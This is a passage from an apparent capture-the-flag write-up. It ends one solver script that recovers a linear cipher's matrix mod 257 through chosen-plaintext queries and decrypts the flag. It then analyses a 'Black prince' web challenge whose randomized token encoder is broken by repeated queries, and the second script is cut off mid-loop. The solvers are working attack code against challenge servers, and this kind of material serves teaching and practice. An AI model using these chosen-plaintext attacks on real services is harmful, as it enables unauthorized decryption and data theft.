</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mat_inv_mod_p</span><span class="p">(</span><span class="n">A</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]],</span> <span class="n">p</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Compute the inverse of A modulo prime p using Gauss-Jordan.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">M</span> <span class="o">=</span> <span class="p">[[</span><span class="n">A</span><span class="p">[</span><span class="n">i</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">%</span> <span class="n">p</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="n">I</span> <span class="o">=</span> <span class="p">[[</span><span class="mi">1</span> <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="n">j</span> <span class="k">else</span> <span class="mi">0</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">col</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Find a pivot row with nonzero in column &#39;col&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">pivot</span> <span class="o">=</span> <span class="n">col</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="n">pivot</span> <span class="o">&lt;</span> <span class="n">n</span> <span class="ow">and</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">][</span><span class="n">col</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pivot</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pivot</span> <span class="o">==</span> <span class="n">n</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Matrix not invertible (no pivot).&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Swap to current row if needed</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">pivot</span> <span class="o">!=</span> <span class="n">col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">]</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">pivot</span><span class="p">],</span> <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">],</span> <span class="n">I</span><span class="p">[</span><span class="n">pivot</span><span class="p">]</span> <span class="o">=</span> <span class="n">I</span><span class="p">[</span><span class="n">pivot</span><span class="p">],</span> <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Normalize pivot row</span>
</span></span><span class="line"><span class="cl">        <span class="n">inv_piv</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">col</span><span class="p">],</span> <span class="n">p</span> <span class="o">-</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>  <span class="c1"># Fermat inverse (p is prime)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">inv_piv</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">            <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">inv_piv</span><span class="p">)</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># Eliminate this column from all other rows</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">r</span> <span class="o">==</span> <span class="n">col</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="n">factor</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">col</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">factor</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">M</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">factor</span> <span class="o">*</span> <span class="n">M</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">                    <span class="n">I</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">I</span><span class="p">[</span><span class="n">r</span><span class="p">][</span><span class="n">j</span><span class="p">]</span> <span class="o">-</span> <span class="n">factor</span> <span class="o">*</span> <span class="n">I</span><span class="p">[</span><span class="n">col</span><span class="p">][</span><span class="n">j</span><span class="p">])</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">I</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">mat_vec_mod_p</span><span class="p">(</span><span class="n">M</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]],</span> <span class="n">v</span><span class="p">:</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">],</span> <span class="n">p</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">n</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">M</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="n">n</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">row</span> <span class="o">=</span> <span class="n">M</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">s</span> <span class="o">+=</span> <span class="n">row</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">*</span> <span class="n">v</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">s</span> <span class="o">%</span> <span class="n">p</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">out</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recover_matrix_K</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">K_cols</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="n">N</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">block</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span>  <span class="c1"># e_i (mod 257)</span>
</span></span><span class="line"><span class="cl">        <span class="n">y</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">block</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">y</span><span class="p">)</span> <span class="o">!=</span> <span class="n">N</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;oracle returned wrong vector length&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">K_cols</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">y</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># Optional progress indicator</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">i</span> <span class="o">==</span> <span class="n">N</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[+] collected </span><span class="si">{</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">N</span><span class="si">}</span><span class="s2"> columns of K&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Convert &#34;list of columns&#34; -&gt; 2D matrix (row-major)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K</span> <span class="o">=</span> <span class="p">[[</span><span class="n">K_cols</span><span class="p">[</span><span class="n">j</span><span class="p">][</span><span class="n">i</span><span class="p">]</span> <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">K</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">strip_zero_padding</span><span class="p">(</span><span class="n">mbytes</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="mi">0</span> <span class="ow">in</span> <span class="n">mbytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">mbytes</span><span class="p">[:</span><span class="n">mbytes</span><span class="o">.</span><span class="n">index</span><span class="p">(</span><span class="mi">0</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">mbytes</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="k">else</span> <span class="s2">&#34;127.0.0.1&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">3</span> <span class="k">else</span> <span class="mi">12346</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] Target: </span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Fetching encrypted flag...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">c_flag</span> <span class="o">=</span> <span class="n">get_encrypted_flag</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Got encrypted flag (257 integers).&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Recovering encryption matrix K via 257 chosen-plaintext queries...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K</span> <span class="o">=</span> <span class="n">recover_matrix_K</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Recovered K.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Inverting K modulo 257...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">K_inv</span> <span class="o">=</span> <span class="n">mat_inv_mod_p</span><span class="p">(</span><span class="n">K</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Inverted K.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[*] Decrypting flag...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_vec</span> <span class="o">=</span> <span class="n">mat_vec_mod_p</span><span class="p">(</span><span class="n">K_inv</span><span class="p">,</span> <span class="n">c_flag</span><span class="p">,</span> <span class="n">P</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Sanity: we expect every coordinate to be in 0..255 (not 256)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">x</span> <span class="o">==</span> <span class="mi">256</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m_vec</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Warning: found value 256 in plaintext vector; replacing with 0 for bytes().&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_bytes</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">((</span><span class="mi">0</span> <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="mi">256</span> <span class="k">else</span> <span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">m_vec</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">m_bytes</span> <span class="o">=</span> <span class="n">strip_zero_padding</span><span class="p">(</span><span class="n">m_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="n">m_bytes</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">,</span> <span class="n">errors</span><span class="o">=</span><span class="s2">&#34;replace&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">decoded</span> <span class="o">=</span> <span class="nb">repr</span><span class="p">(</span><span class="n">m_bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="black-prince">Black prince<a hidden class="anchor" aria-hidden="true" href="#black-prince">#</a></h3>
<h4 id="analysis-8">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-8">#</a></h4>
<ul>
<li>Recon showed a very simple web app with two endpoints:
<ul>
<li><code>/encode</code>: takes an input constrained to uppercase letters A‚ÄìZ, digits 0‚Äì9, braces <code>{}</code> and underscore <code>_</code>, and renders a sequence of four-letter tokens.</li>
<li><code>/flag</code>: renders a long &ldquo;sentence&rdquo; made entirely of four-letter words (tokens) instead of a human-readable flag.</li>
</ul>
</li>
</ul>
<p><code>/encode</code> is a randomized encoder that maps each input character to one of several possible four-letter tokens. The <code>/flag</code> page is the encoded flag using those tokens.</p>
<p>A single pass over the character set only reveals a subset of tokens. To decode <code>/flag</code>, we must harvest all token variants that appear on <code>/flag</code> by repeatedly querying <code>/encode</code> with repeated characters and collecting any hits that match tokens seen on <code>/flag</code>.</p>
<p>The allowed alphabet is 39 symbols (26 letters + 10 digits + <code>{</code>, <code>}</code>, <code>_</code>).</p>
<h4 id="solution-8">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-8">#</a></h4>
<p>So, the strategy is to fetch the ordered token sequence from <code>/flag</code>, then repeatedly send <code>ch * N</code> for each allowed character to <code>/encode</code>, recording any returned token that also appears on <code>/flag</code>. When every <code>/flag</code> token has a mapped character, reconstruct the flag by substitution in order. In practice, repeating a character coaxes out multiple token variants.</p>
<h4 id="script-7">Script<a hidden class="anchor" aria-hidden="true" href="#script-7">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">Dict</span><span class="p">,</span> <span class="n">List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">bs4</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">BASE_URL</span> <span class="o">=</span> <span class="s1">&#39;http://168908dd.ctf.ac.upt.ro&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">ROUNDS</span> <span class="o">=</span> <span class="mi">60</span>
</span></span><span class="line"><span class="cl"><span class="n">REPEATS</span> <span class="o">=</span> <span class="mi">10</span>
</span></span><span class="line"><span class="cl"><span class="n">SLEEP</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">CHARSET</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="si">{}</span><span class="s1">_&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">FIELD_NAME</span> <span class="o">=</span> <span class="s1">&#39;text&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">session</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">update</span><span class="p">({</span><span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;simple-encoder-solver/1.0&#39;</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_tokens</span><span class="p">(</span><span class="n">html</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">soup</span> <span class="o">=</span> <span class="n">bs4</span><span class="o">.</span><span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">html</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">div</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;div&#39;</span><span class="p">,</span> <span class="n">class_</span><span class="o">=</span><span class="s1">&#39;encoded&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">div</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">[</span><span class="n">el</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="k">for</span> <span class="n">el</span> <span class="ow">in</span> <span class="n">div</span><span class="o">.</span><span class="n">find_all</span><span class="p">()</span> <span class="k">if</span> <span class="n">el</span><span class="o">.</span><span class="n">get_text</span><span class="p">(</span><span class="n">strip</span><span class="o">=</span><span class="kc">True</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_flag_tokens</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE_URL</span> <span class="o">+</span> <span class="s1">&#39;/flag&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_tokens</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encode</span><span class="p">(</span><span class="n">text</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">str</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE_URL</span> <span class="o">+</span> <span class="s1">&#39;/encode&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="n">FIELD_NAME</span><span class="p">:</span> <span class="n">text</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_tokens</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">solve</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">flag_tokens</span> <span class="o">=</span> <span class="n">get_flag_tokens</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">flag_tokens</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s1">&#39;No tokens returned from /flag&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">needed</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">flag_tokens</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">mapping</span><span class="p">:</span> <span class="n">Dict</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">ROUNDS</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">chars</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">CHARSET</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">random</span><span class="o">.</span><span class="n">shuffle</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">ch</span> <span class="ow">in</span> <span class="n">chars</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">tokens</span> <span class="o">=</span> <span class="n">encode</span><span class="p">(</span><span class="n">ch</span> <span class="o">*</span> <span class="n">REPEATS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tokens</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">needed</span> <span class="ow">and</span> <span class="n">t</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">mapping</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">mapping</span><span class="p">[</span><span class="n">t</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">SLEEP</span><span class="p">:</span>
